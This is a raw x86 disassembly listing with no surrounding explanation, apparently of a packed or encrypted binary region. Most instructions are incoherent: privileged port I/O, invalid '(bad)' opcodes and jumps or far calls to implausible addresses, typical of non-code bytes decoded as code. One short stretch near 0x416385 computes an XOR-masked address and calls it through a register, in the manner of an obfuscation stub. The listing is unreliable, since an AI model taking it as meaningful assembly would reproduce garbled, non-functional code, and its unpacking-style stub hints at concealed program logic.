  4160ee:	in     al,dx
  4160ef:	cwde   
  4160f0:	popf   
  4160f1:	xchg   DWORD PTR [ebx],esp
  4160f3:	mov    esi,0x88a29ff2
  4160f8:	lods   eax,DWORD PTR ds:[esi]
  4160f9:	imul   edi,DWORD PTR [ecx-0x4ec02091],0x45
  416100:	fs adc eax,0x8381095e
  416106:	pop    edx
  416107:	and    eax,0xa68dbc78
  41610c:	fcmovne st,st(2)
  41610e:	test   esp,ebp
  416110:	mov    cl,0x9e
  416112:	push   0xffffff8f
  416114:	pop    ss
  416115:	push   0xed8da118
  41611a:	addr16 retf 0x9c52
  41611e:	sti    
  41611f:	and    eax,0x4bb2e3a3
  416124:	dec    ebp
  416125:	pop    es
  416126:	mov    eax,0x11d903e3
  41612b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41612c:	xchg   ebp,eax
  41612d:	bound  edx,QWORD PTR [edi]
  41612f:	push   eax
  416130:	fisub  DWORD PTR [ebx+edi*2-0x191b404e]
  416137:	dec    esp
  416138:	ins    DWORD PTR es:[edi],dx
  416139:	stc    
  41613a:	mov    esi,0x8ae9a0fc
  41613f:	xor    esi,DWORD PTR [edi-0x18e234d8]
  416145:	fild   WORD PTR [ecx+0x12]
  416148:	or     cl,BYTE PTR [edi+0x1e8fa5d1]
  41614e:	je     0x416177
  416150:	xor    ebx,ebx
  416152:	xchg   esi,eax
  416153:	xchg   ecx,eax
  416154:	addr16 inc esi
  416156:	in     al,0xd3
  416158:	cs and bh,bh
  41615b:	data16 icebp 
  41615d:	cmp    al,BYTE PTR [ecx]
  41615f:	add    BYTE PTR [esp+edx*2+0x4d],dh
  416163:	and    eax,ecx
  416165:	call   0x50056ac0
  41616a:	push   0x66
  41616c:	mov    cl,0xdf
  41616e:	fdivr  st,st(3)
  416170:	xor    DWORD PTR [edx],esp
  416172:	lea    esi,[eax-0x7e]
  416175:	stc    
  416176:	jbe    0x41618e
  416178:	fdivr  DWORD PTR [edx]
  41617a:	aad    0x85
  41617c:	fnstcw WORD PTR [esi+0x1]
  41617f:	mov    ss,eax
  416181:	jmp    edi
  416183:	dec    eax
  416184:	pushf  
  416185:	int    0xcc
  416187:	mov    ebp,0xbf6a23ed
  41618c:	dec    esi
  41618d:	js     0x4161dc
  41618f:	and    BYTE PTR [ecx],al
  416191:	aas    
  416192:	and    al,0xb6
  416194:	imul   DWORD PTR [edx]
  416196:	out    0x43,eax
  416198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416199:	push   0x2d9b95f5
  41619e:	lds    edi,FWORD PTR [ebp-0x5b259fa8]
  4161a4:	pop    ebp
  4161a5:	jecxz  0x4161ec
  4161a7:	outs   dx,DWORD PTR ds:[esi]
  4161a8:	xchg   esp,eax
  4161a9:	sub    eax,edx
  4161ab:	dec    ebx
  4161ac:	mov    edi,0x1033167f
  4161b1:	dec    esi
  4161b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161b3:	cmp    edx,edx
  4161b5:	lds    ebx,FWORD PTR [edi]
  4161b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161b8:	sbb    bl,dh
  4161ba:	sahf   
  4161bb:	cdq    
  4161bc:	es mov ah,0xf3
  4161c0:	iret   
  4161c1:	fcomp  QWORD PTR [ebx+eiz*2-0x139f7746]
  4161c8:	mov    edi,0x249ae7b
  4161cd:	dec    edi
  4161cf:	mov    eax,0xd2867c86
  4161d4:	mov    eax,0x4b4c5749
  4161d9:	cmp    ch,BYTE PTR [edi+eax*4]
  4161dc:	mov    eax,0xf1ce2cc
  4161e1:	ss sub al,0xc9
  4161e4:	data16 sahf 
  4161e6:	xor    eax,DWORD PTR [ebx-0x5b]
  4161e9:	pop    esi
  4161ea:	test   eax,0xe417fda9
  4161ef:	lahf   
  4161f0:	stos   BYTE PTR es:[edi],al
  4161f1:	jne    0x416267
  4161f3:	mov    esi,0xee312043
  4161f8:	iret   
  4161f9:	cmp    esi,DWORD PTR [ecx]
  4161fb:	mov    ds:0x7b13026d,al
  416200:	xor    eax,0x25d48c01
  416205:	jp     0x416271
  416207:	and    al,0x50
  416209:	pop    ebp
  41620a:	mov    ebp,0x27b7792b
  41620f:	xchg   al,cl
  416211:	cs out 0x58,al
  416214:	stos   DWORD PTR es:[edi],eax
  416215:	in     eax,dx
  416216:	mov    ebx,0xf12d8229
  41621b:	xchg   DWORD PTR [esi+0x2fac2bc1],edx
  416221:	cld    
  416222:	dec    esp
  416223:	xchg   edi,eax
  416224:	test   DWORD PTR [edx+0x11766e60],0x4a1a91f8
  41622e:	stos   BYTE PTR es:[edi],al
  41622f:	cli    
  416230:	and    BYTE PTR [ebx-0x67],dh
  416233:	sbb    al,0x86
  416235:	jns    0x416240
  416237:	repz or edx,0x2ad30f3e
  41623e:	cmc    
  41623f:	adc    bh,cl
  416241:	and    eax,0x8e4628f3
  416246:	into   
  416247:	mov    esi,0xf2b2f58e
  41624c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41624d:	or     al,ch
  41624f:	pop    ecx
  416250:	fs jbe 0x416299
  416253:	pop    ds
  416254:	int    0xfc
  416256:	cmp    esp,ebp
  416258:	out    0xe,eax
  41625a:	in     al,0x3a
  41625c:	sbb    esi,eax
  41625e:	push   ds
  41625f:	call   0x42492bd0
  416264:	inc    ecx
  416265:	inc    edi
  416266:	sbb    eax,0x1f9f9210
  41626b:	sub    DWORD PTR [esi+eiz*4-0x2fa7068c],0xffffffa5
  416273:	dec    ebx
  416274:	mov    esi,0x62e3f16
  416279:	jnp    0x4162c7
  41627b:	jmp    0x41625a
  41627d:	dec    ebp
  41627e:	mov    dl,0xbd
  416280:	pop    ds
  416281:	pop    gs
  416283:	and    dh,dh
  416285:	in     eax,dx
  416286:	stos   BYTE PTR es:[edi],al
  416287:	sbb    al,0x83
  416289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41628a:	addr16 push ds
  41628c:	or     eax,0xf9975689
  416291:	int3   
  416292:	push   edx
  416293:	sar    al,0x49
  416296:	and    BYTE PTR [edi+eax*2+0x58],ah
  41629a:	jnp    0x416267
  41629c:	rcl    BYTE PTR [esi-0x34],0xe6
  4162a0:	pop    eax
  4162a1:	cld    
  4162a2:	cld    
  4162a3:	(bad)  
  4162a5:	xor    esi,DWORD PTR [esi+0x75f943fd]
  4162ab:	or     al,0x2d
  4162ad:	adc    bh,bl
  4162af:	xchg   ebx,eax
  4162b0:	outs   dx,DWORD PTR ds:[esi]
  4162b1:	inc    ecx
  4162b2:	inc    edi
  4162b3:	sub    edi,DWORD PTR [ebp-0x390f0834]
  4162b9:	or     al,0x91
  4162bb:	mov    esi,0x2732758
  4162c0:	push   ebp
  4162c1:	pop    eax
  4162c2:	stos   DWORD PTR es:[edi],eax
  4162c3:	out    dx,eax
  4162c4:	push   0x5b23f501
  4162c9:	popf   
  4162ca:	aam    0xf2
  4162cc:	(bad)  
  4162cd:	jge    0x41633d
  4162cf:	push   ds
  4162d0:	loop   0x416332
  4162d2:	mov    edx,DWORD PTR [edx-0x3c880b38]
  4162d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162d9:	std    
  4162da:	and    eax,0xb2e89fcf
  4162df:	mov    ds:0x77d876c5,al
  4162e4:	popa   
  4162e5:	icebp  
  4162e6:	add    esp,DWORD PTR [eax+0x62c0b32c]
  4162ec:	or     BYTE PTR [ebx+ebx*1],bl
  4162ef:	mov    ss,esp
  4162f1:	inc    edi
  4162f2:	jge    0x4162e6
  4162f4:	mov    al,ds:0x66146471
  4162f9:	and    DWORD PTR [ebx+0x1b],edx
  4162fc:	push   0x28
  4162fe:	(bad)  
  4162ff:	loopne 0x41637e
  416301:	add    BYTE PTR [ecx],bh
  416303:	mov    esp,0xd7452de0
  416308:	daa    
  416309:	sub    cl,BYTE PTR [ebp+0x2944a0e]
  41630f:	lds    esp,FWORD PTR [edx-0x417d2c17]
  416315:	jge    0x416361
  416317:	xor    bh,BYTE PTR [esi+0x6f21323f]
  41631d:	mov    eax,0x326bc2ca
  416322:	ja     0x416399
  416324:	adc    DWORD PTR [ebx],ebp
  416326:	lahf   
  416327:	fcompp 
  416329:	mov    cl,0x1
  41632b:	sub    edx,esp
  41632d:	add    esi,ecx
  41632f:	aas    
  416330:	cmp    al,0x3d
  416332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416333:	dec    esp
  416334:	add    ebx,DWORD PTR [ecx+eiz*4-0x64]
  416338:	es xor eax,0xc340e761
  41633e:	call   0xecd986d0
  416343:	pop    esp
  416344:	daa    
  416345:	cdq    
  416346:	mov    ds,WORD PTR [ebp+ebp*4-0x15]
  41634a:	ins    DWORD PTR es:[edi],dx
  41634b:	retf   
  41634c:	xchg   esi,eax
  41634d:	mov    dh,0xb5
  41634f:	aaa    
  416350:	adc    ch,BYTE PTR [ebp+0x213e5b17]
  416356:	mov    dl,0x16
  416358:	jo     0x416329
  41635a:	push   esi
  41635b:	clc    
  41635c:	mov    ds:0x2a7c567a,al
  416361:	mov    BYTE PTR [bx+di+0x4deb],cl
  416366:	sahf   
  416367:	dec    edi
  416368:	jae    0x41630b
  41636a:	cmp    DWORD PTR [ebp-0x72f7b275],esp
  416370:	mov    WORD PTR [edx],cs
  416372:	pushf  
  416373:	jb     0x4163a7
  416375:	add    BYTE PTR [ebx],bh
  416377:	enter  0x850f,0x22
  41637b:	icebp  
  41637c:	(bad)  
  41637d:	dec    DWORD PTR [ebx+0x5e9de]
  416383:	add    BYTE PTR [eax],al
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0x58dc841
  4163bf:	les    ebp,FWORD PTR [edi]
  4163c1:	adc    edx,DWORD PTR [edi+edi*2]
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x41640a
  4163ca:	ret    
  4163cb:	cmp    dh,al
  4163cd:	in     eax,0x32
  4163cf:	(bad)  
  4163d0:	in     eax,0x6a
  4163d2:	dec    ecx
  4163d3:	dec    ebx
  4163d4:	arpl   WORD PTR [edi+0x5c],si
  4163d7:	jl     0x416432
  4163d9:	sti    
  4163da:	or     al,BYTE PTR [ebx+0x280a8e65]
  4163e0:	stc    
  4163e1:	cmp    al,0x4b
  4163e3:	inc    ebx
  4163e4:	icebp  
  4163e5:	cmp    ch,cl
  4163e7:	dec    DWORD PTR [edx-0x76717082]
  4163ed:	jo     0x416386
  4163ef:	in     eax,dx
  4163f0:	jo     0x416435
  4163f2:	test   al,0xda
  4163f4:	ins    DWORD PTR es:[edi],dx
  4163f5:	std    
  4163f6:	das    
  4163f7:	or     DWORD PTR [eax-0x65],esp
  4163fa:	jnp    0x41645d
  4163fc:	pop    ebx
  4163fd:	fwait
  4163fe:	ret    0x762
  416401:	mov    ch,0xa7
  416403:	xor    bh,dh
  416405:	call   ebx
  416407:	icebp  
  416408:	push   edx
  416409:	xchg   ebp,eax
  41640a:	aaa    
  41640b:	add    dh,BYTE PTR [eax+0x7e]
  41640e:	mov    cs,WORD PTR [edx-0x22]
  416411:	xchg   ebx,eax
  416412:	cmp    bl,dl
  416414:	leave  
  416415:	cmp    al,BYTE PTR [ecx]
  416417:	popa   
  416418:	jmp    0xd88:0xee0de0e8
  41641f:	and    cl,BYTE PTR [ebx]
  416421:	or     al,bl
  416423:	xor    bl,BYTE PTR [ebx-0x38dfffa2]
  416429:	pusha  
  41642a:	jb     0x416439
  41642c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41642d:	xlat   BYTE PTR ds:[ebx]
  41642e:	jnp    0x4164ac
  416430:	push   ds
  416431:	xor    al,0xb8
  416433:	inc    ecx
  416434:	and    BYTE PTR [ebx+edx*1-0x13ae121d],cl
  41643b:	cwde   
  41643c:	call   0x4157:0x9b725a
  416443:	xchg   ebx,eax
  416444:	jp     0x416430
  416446:	scas   al,BYTE PTR es:[edi]
  416447:	jo     0x416450
  416449:	jmp    0xea3b8a4d
  41644e:	jne    0x416494
  416450:	sti    
  416451:	out    dx,eax
  416452:	inc    ebx
  416453:	jmp    0xe4e8:0x7c0fd337
  41645a:	stc    
  41645b:	push   edx
  41645c:	mov    dl,0xba
  41645e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41645f:	stos   BYTE PTR es:[edi],al
  416460:	push   cs
  416461:	pop    ds
  416462:	lea    edi,[ecx+0x43]
  416465:	fstp   DWORD PTR [edi-0x63]
  416468:	loop   0x41645a
  41646a:	mov    ah,0xf9
  41646c:	pop    ebp
  41646d:	jle    0x416493
  41646f:	scas   eax,DWORD PTR es:[edi]
  416470:	lods   eax,DWORD PTR ds:[esi]
  416471:	call   0x36a1:0xe4b2d839
  416478:	pusha  
  416479:	bound  ebp,QWORD PTR [ebp-0x63]
  41647c:	js     0x416471
  41647e:	add    BYTE PTR [esi+0x22],0x24
  416482:	pop    eax
  416483:	lahf   
  416484:	dec    ecx
  416485:	inc    edx
  416486:	into   
  416487:	mov    ebx,DWORD PTR [eax+0x60]
  41648a:	cli    
  41648b:	dec    esi
  41648c:	fst    QWORD PTR [ebx+0x59a7ec70]
  416492:	dec    ebp
  416493:	call   0x457c2a8e
  416498:	pop    eax
  416499:	imul   esi,DWORD PTR [ebx-0x7],0x251af26b
  4164a0:	add    eax,0xf281c801
  4164a5:	xchg   esp,eax
  4164a6:	push   0xdd91ccea
  4164ab:	cli    
  4164ac:	adc    al,BYTE PTR [ebp-0x278ca1d4]
  4164b2:	mov    esi,0x641af13d
  4164b7:	call   0xa3ce:0xfa2c8b0c
  4164be:	(bad)  
  4164bf:	es cmp al,0x78
  4164c2:	cli    
  4164c3:	xor    DWORD PTR [esi+0x48be5752],eax
  4164c9:	dec    eax
  4164ca:	xor    al,0x1e
  4164cc:	les    ebp,FWORD PTR [edi]
  4164ce:	mov    edi,0xc1039c4b
  4164d3:	mov    cl,0x7
  4164d5:	loop   0x416543
  4164d7:	cmp    bh,BYTE PTR [ecx]
  4164d9:	push   eax
  4164da:	cmp    edi,DWORD PTR [edi+0x36]
  4164dd:	data16 das 
  4164df:	pop    DWORD PTR [eax+eax*1]
  4164e2:	imul   eax,DWORD PTR [edx],0xffffffae
  4164e5:	scas   al,BYTE PTR es:[edi]
  4164e6:	inc    eax
  4164e7:	(bad)  
  4164e8:	adc    cl,ah
  4164ea:	(bad)  
  4164eb:	in     al,0x9a
  4164ed:	adc    DWORD PTR ds:0x7602bcb8,ebp
  4164f3:	das    
  4164f4:	js     0x41648b
  4164f6:	not    esp
  4164f8:	mov    bl,BYTE PTR [ebx-0x44605578]
  4164fe:	and    bl,BYTE PTR [ecx+0x59b6bb38]
  416504:	or     eax,0x6094af82
  416509:	adc    BYTE PTR ds:0x9938c014,bl
  41650f:	dec    edi
  416510:	mov    al,ds:0x996a193f
  416515:	iret   
  416516:	ror    BYTE PTR [eax],cl
  416518:	or     al,ah
  41651a:	mov    edx,0x3b8611e3
  41651f:	cmp    eax,0xae43d98d
  416524:	add    edx,ebx
  416526:	in     eax,0xd8
  416528:	fistp  WORD PTR [edi]
  41652a:	adc    al,0x1
  41652c:	js     0x416511
  41652e:	(bad)  
  41652f:	and    eax,0x1365ffbe
  416534:	popf   
  416535:	fdivr  st,st(3)
  416537:	sbb    bh,BYTE PTR [esi]
  416539:	add    eax,0x892f269f
  41653e:	push   0xd2810fb1
  416543:	aad    0xca
  416545:	stc    
  416546:	xor    dh,bl
  416548:	push   ds
  416549:	sahf   
  41654a:	mov    cl,bh
  41654c:	sub    BYTE PTR [eax-0x4],0xc9
  416550:	arpl   WORD PTR [eax],dx
  416552:	cwde   
  416553:	fcom   QWORD PTR [edi]
  416555:	mov    al,0x52
  416557:	ret    
  416558:	sub    al,BYTE PTR [esp+esi*1-0x6c]
  41655c:	popf   
  41655d:	dec    ecx
  41655e:	loope  0x416509
  416560:	cmp    ebp,DWORD PTR [edx]
  416562:	jo     0x4165df
  416564:	popf   
  416565:	ss lock out 0xf5,eax
  416569:	mov    eax,0x80faf445
  41656e:	jb     0x416521
  416570:	mov    cl,BYTE PTR [eax-0x59]
  416573:	ds and bl,bl
  416576:	repnz mov edi,0xe01059df
  41657c:	test   al,0xab
  41657e:	jnp    0x4165c5
  416580:	shr    BYTE PTR [esi-0x36],1
  416583:	add    BYTE PTR [ebx-0x44],0x62
  416587:	cmp    ebp,DWORD PTR [esi+0x3]
  41658a:	stos   DWORD PTR es:[edi],eax
  41658b:	cmp    al,0x71
  41658d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41658e:	cmp    eax,0x22ee91ed
  416593:	jns    0x41654a
  416595:	test   eax,0xdfca9ee5
  41659a:	repnz adc ebp,DWORD PTR [ebp-0x68]
  41659e:	nop
  41659f:	in     eax,dx
  4165a0:	aaa    
  4165a1:	mov    edi,0xeeca1add
  4165a6:	into   
  4165a7:	jbe    0x4165b0
  4165a9:	adc    ebp,0xef1c587b
  4165af:	add    ch,BYTE PTR [edx+0x511f9230]
  4165b5:	xchg   ebp,eax
  4165b6:	cs aad 0x41
  4165b9:	sbb    ecx,DWORD PTR [ebx+0x33]
  4165bc:	repz mov edx,0x6635672d
  4165c2:	sbb    cl,BYTE PTR [edx-0x45]
  4165c5:	mov    ds:0x501497b3,al
  4165ca:	std    
  4165cb:	xor    eax,0x8d324e33
  4165d0:	cdq    
  4165d1:	push   0x250de449
  4165d6:	adc    edi,DWORD PTR [ecx+edi*4-0x354bf64a]
  4165dd:	jmp    0xf21299c4
  4165e2:	push   ecx
  4165e3:	outs   dx,DWORD PTR ds:[esi]
  4165e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165e5:	inc    esp
  4165e6:	xor    BYTE PTR [eax-0x29],ch
  4165e9:	inc    ebp
  4165ea:	in     eax,dx
  4165eb:	call   0xf849c8
  4165f0:	xor    al,0x13
  4165f2:	in     al,dx
  4165f3:	or     edi,edx
  4165f5:	pop    esi
  4165f6:	and    dh,BYTE PTR [ecx-0x67d517ec]
  4165fc:	xchg   esi,eax
  4165fd:	pop    esp
  4165fe:	dec    ecx
  4165ff:	mov    edi,0x995f9e0d
  416604:	or     esi,DWORD PTR [ecx+0x39]
  416607:	(bad)  
  416608:	(bad)  
  416609:	scas   eax,DWORD PTR es:[edi]
  41660a:	mov    ecx,0x77a2520e
  41660f:	sub    ebp,ecx
  416611:	inc    eax
  416612:	add    ebx,DWORD PTR [edi+0x66]
  416615:	cmp    BYTE PTR [ecx+edi*2],dh
  416618:	cmp    bh,BYTE PTR [ebx+0x50]
  41661b:	or     ebx,ebp
  41661d:	call   0x7936:0x319b2618
  416624:	jb     0x41663f
  416626:	(bad)  
  416627:	daa    
  416628:	push   edi
  416629:	and    ebx,DWORD PTR [ebp+edi*1+0x63]
  41662d:	xchg   DWORD PTR [ebx-0x2c97b6ec],edx
  416633:	push   edx
  416634:	ffree  st(7)
  416636:	sbb    BYTE PTR [eax+0x7662838d],0x96
  41663d:	leave  
  41663e:	enter  0x386b,0x8
  416642:	jle    0x4165e8
  416644:	fstp   QWORD PTR [ecx+0x7a]
  416647:	stc    
  416648:	fxch   st(1)
  41664a:	add    edx,DWORD PTR [ebp*4+0x77291ad1]
  416651:	jp     0x416688
  416653:	dec    edx
  416654:	push   0x822c04d0
  416659:	jne    0x416654
  41665b:	cmp    al,0x18
  41665d:	inc    di
  41665f:	(bad)  
  416660:	repz inc ecx
  416662:	jne    0x416607
  416664:	mov    ebx,0xa267d776
  416669:	imul   esp,DWORD PTR [edi+eax*8-0x7a],0x6613fb43
  416671:	inc    edx
  416672:	mov    ebx,0x75bfb3fa
  416677:	pop    eax
  416678:	or     eax,0x7a859a4d
  41667d:	daa    
  41667e:	push   esi
  41667f:	mov    DWORD PTR [ecx+0x2],esi
  416682:	fidivr DWORD PTR [esi+0x1a]
  416685:	call   0x1bf0cc0f
  41668a:	push   0x6a220a80
  41668f:	add    edx,DWORD PTR [edx+0x6a590a6a]
  416695:	add    al,0x5b
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x416674
  4166ae:	mov    ?,esi
  4166b0:	(bad)  
  4166b1:	pop    esp
  4166b2:	adc    bh,BYTE PTR [edi+0x70]
  4166b5:	mov    ecx,0x7770707e
  4166ba:	enter  0xecf5,0x97
  4166be:	cli    
  4166bf:	into   
  4166c0:	out    dx,eax
  4166c1:	rcl    BYTE PTR [eax],0xf4
  4166c4:	pop    ebp
  4166c5:	add    al,0xd7
  4166c7:	sbb    DWORD PTR [edx+0x6],edx
  4166ca:	icebp  
  4166cb:	loopne 0x4166c8
  4166cd:	push   eax
  4166ce:	xor    BYTE PTR [edi+0x29],dl
  4166d1:	in     eax,0xc8
  4166d3:	push   0xfffffff3
  4166d5:	cmp    eax,DWORD PTR [edi+0x50]
  4166d8:	or     ah,0xf3
  4166db:	sahf   
  4166dc:	scas   al,BYTE PTR es:[edi]
  4166dd:	push   esi
  4166de:	jbe    0x4166da
  4166e0:	xchg   ebx,eax
  4166e1:	scas   al,BYTE PTR es:[edi]
  4166e2:	pslld  mm0,QWORD PTR [ecx+0xc28dec5]
  4166e9:	push   eax
  4166ea:	mov    BYTE PTR [esi+eax*8],0x52
  4166ee:	dec    ecx
  4166ef:	push   ecx
  4166f0:	fdiv   QWORD PTR [edx]
  4166f2:	popf   
  4166f3:	(bad)
  4166f6:	push   es
  4166f7:	xor    ebx,DWORD PTR [esi+0xc1119dd]
  4166fd:	inc    edi
  4166fe:	es enter 0xbdef,0x42
  416703:	or     bh,bh
  416705:	ficom  WORD PTR [ebx+0x1]
  416708:	lods   al,BYTE PTR ds:[esi]
  416709:	scas   eax,DWORD PTR es:[edi]
  41670a:	in     eax,0x1f
  41670c:	mov    ah,0x60
  41670e:	rol    DWORD PTR [edi-0xb],cl
  416711:	in     al,0xea
  416713:	add    BYTE PTR [esi-0x545a95c4],al
  416719:	dec    eax
  41671a:	mov    esi,0xf7679da4
  41671f:	pop    esi
  416720:	xbegin 0x1e3b38fb
  416726:	je     0x416756
  416728:	repz push es
  41672a:	sub    eax,0xa2c706a2
  41672f:	push   cs
  416730:	sub    al,0xfe
  416732:	dec    ecx
  416733:	mov    bh,0x1e
  416735:	sub    eax,0x3903524b
  41673a:	cmp    ebx,DWORD PTR [ecx]
  41673c:	loope  0x416741
  41673e:	stos   DWORD PTR es:[edi],eax
  41673f:	xor    edx,DWORD PTR [edi]
  416741:	aas    
  416742:	lods   al,BYTE PTR ds:[esi]
  416743:	outs   dx,BYTE PTR ds:[esi]
  416744:	repz cli 
  416746:	and    DWORD PTR [ebx+ecx*8+0x4f],ebp
  41674a:	sub    edi,DWORD PTR [edi-0x1f]
  41674d:	push   es
  41674e:	iret   
  41674f:	je     0x4166f3
  416751:	push   ecx
  416752:	aad    0x6f
  416754:	ret    
  416755:	pushf  
  416756:	xchg   esi,eax
  416757:	push   esp
  416758:	nop
  416759:	lea    edi,[edi]
  41675b:	repnz xchg ebx,eax
  41675d:	aas    
  41675e:	aas    
  41675f:	mov    ah,0xd
  416761:	adc    eax,0x14e398fa
  416766:	pop    ebp
  416767:	(bad)  
  416768:	mov    ds:0x5b538cfc,al
  41676d:	outs   dx,BYTE PTR ds:[esi]
  41676e:	jge    0x416775
  416770:	int    0x43
  416772:	add    ecx,edx
  416774:	sbb    al,0x34
  416776:	retf   0xa502
  416779:	xor    BYTE PTR [ebx],dh
  41677b:	ret    0xdf10
  41677e:	sub    eax,0x6c5fe3c0
  416783:	push   esi
  416784:	push   ebp
  416785:	pop    edx
  416786:	loop   0x41672f
  416788:	pop    ss
  416789:	rcr    cl,1
  41678b:	cs shl al,0x91
  41678f:	ret    
  416790:	add    DWORD PTR [ebp-0x58],0xb9f2ecbe
  416797:	cdq    
  416798:	popa   
  416799:	dec    edi
  41679a:	push   ds
  41679b:	add    eax,0xe9e35849
  4167a0:	fcomp  DWORD PTR [eax+esi*2+0x15462168]
  4167a7:	inc    edi
  4167a8:	cwde   
  4167a9:	std    
  4167aa:	push   ds
  4167ab:	int    0x20
  4167ad:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4167af:	mov    dh,BYTE PTR [ecx-0x4c]
  4167b2:	adc    BYTE PTR [ebp+0x19146976],0x16
  4167b9:	push   0x4cf2b343
  4167be:	loop   0x41680b
  4167c0:	cmp    al,0x58
  4167c2:	inc    ebp
  4167c3:	push   0xffffffa2
  4167c5:	aaa    
  4167c6:	ins    DWORD PTR es:[edi],dx
  4167c7:	push   ds
  4167c8:	pop    eax
  4167c9:	pop    ebx
  4167ca:	sub    BYTE PTR es:[ebx],al
  4167cd:	test   BYTE PTR [ebp-0x46],bh
  4167d0:	and    ebp,DWORD PTR [eax]
  4167d2:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167d4:	pop    es
  4167d5:	std    
  4167d6:	icebp  
  4167d7:	cs das 
  4167d9:	dec    esi
  4167da:	push   edi
  4167db:	mov    cl,0x5f
  4167dd:	jb     0x4167a7
  4167df:	shl    eax,cl
  4167e1:	imul   BYTE PTR [ebx-0x4365d0e1]
  4167e7:	inc    ebx
  4167e8:	mov    ah,0x25
  4167ea:	cmp    bh,BYTE PTR [edx]
  4167ec:	int3   
  4167ed:	inc    eax
  4167ee:	pop    esp
  4167ef:	and    DWORD PTR [edx],esi
  4167f1:	sub    al,0x52
  4167f3:	mov    ah,0xd4
  4167f5:	ror    BYTE PTR [ebp+0x4aad9c44],0xb8
  4167fc:	call   0xda88576d
  416801:	les    eax,FWORD PTR [edx]
  416803:	mov    eax,ds:0x2634b01f
  416808:	iret   
  416809:	mov    edi,0xc7055c38
  41680e:	jbe    0x4167dc
  416810:	or     DWORD PTR [edx-0x41],esi
  416813:	test   DWORD PTR [ebx-0x2e2babd2],0x2766861f
  41681d:	aaa    
  41681e:	mov    ah,0xb6
  416820:	in     eax,dx
  416821:	lods   al,BYTE PTR ds:[esi]
  416822:	jo     0x4167c7
  416824:	arpl   WORD PTR [ebx+0x25],ax
  416827:	adc    eax,edx
  416829:	ds icebp 
  41682b:	call   0x7a7169dc
  416830:	adc    DWORD PTR [eax+0x43a506d0],esp
  416836:	in     eax,dx
  416837:	hlt    
  416838:	arpl   WORD PTR [ebp*2-0x13f40340],cx
  41683f:	shr    BYTE PTR ss:[eax],cl
  416842:	and    BYTE PTR [esi-0x6e],bl
  416845:	fdiv   DWORD PTR ds:0x51ca325f
  41684b:	aam    0x6f
  41684d:	outs   dx,BYTE PTR ds:[esi]
  41684e:	in     al,dx
  41684f:	pop    ecx
  416850:	jmp    0x215b:0x81d5775a
  416857:	and    ah,dl
  416859:	das    
  41685a:	lea    ebx,[ebx-0x44d7db84]
  416860:	outs   dx,BYTE PTR ds:[esi]
  416861:	mov    ebx,0x90e4c56d
  416866:	sbb    eax,0xc868e779
  41686b:	and    ebp,DWORD PTR [ecx-0x7f]
  41686e:	or     al,0xf7
  416870:	inc    edi
  416871:	stc    
  416872:	sub    dl,ch
  416874:	jl     0x41680a
  416876:	xchg   ecx,eax
  416877:	imul   ebx,DWORD PTR [eax+0x6bb155b3],0xffffffb6
  41687e:	and    DWORD PTR [esi-0xe],edi
  416881:	and    DWORD PTR [esi+0x4d],ecx
  416884:	xchg   ebp,eax
  416885:	cmp    DWORD PTR [eax],esi
  416887:	push   ss
  416888:	fild   WORD PTR [edx+0x102fc92f]
  41688e:	fdivr  DWORD PTR [esp+eax*2-0x2]
  416892:	mov    ds:0x980fad99,al
  416897:	jl     0x41688f
  416899:	shr    DWORD PTR [ebx+0x14c9d808],cl
  41689f:	aas    
  4168a0:	cmc    
  4168a1:	sbb    BYTE PTR [edi],cl
  4168a3:	rcl    DWORD PTR [eax],0xff
  4168a6:	sbb    DWORD PTR [ebx+0x212e5c92],ecx
  4168ac:	sub    BYTE PTR [eax-0x2],0x64
  4168b0:	arpl   bp,bp
  4168b2:	mov    ecx,0x42031ed0
  4168b7:	mov    ch,0x6c
  4168b9:	pop    ecx
  4168ba:	retf   
  4168bb:	int    0xc3
  4168bd:	mov    WORD PTR [edi-0x2b],cs
  4168c0:	mov    ds:0x47d116d9,al
  4168c5:	mov    dh,0xb
  4168c7:	sbb    eax,0x6ace2c9f
  4168cc:	loopne 0x4168d9
  4168ce:	loop   0x416857
  4168d0:	imul   edx,esi,0xffffffa5
  4168d3:	sub    ch,BYTE PTR [esi]
  4168d5:	sbb    ch,BYTE PTR [ebx-0x71]
  4168d8:	push   es
  4168d9:	retf   0xf386
  4168dc:	pop    esp
  4168dd:	popa   
  4168de:	in     eax,dx
  4168df:	jnp    0x4168b9
  4168e1:	ret    
  4168e2:	sub    BYTE PTR [eax],bh
  4168e4:	inc    esp
  4168e5:	jp     0x4168a8
  4168e7:	(bad)  
  4168e8:	mov    dh,0x1a
  4168ea:	pop    ecx
  4168eb:	add    BYTE PTR [ebx],0x7d
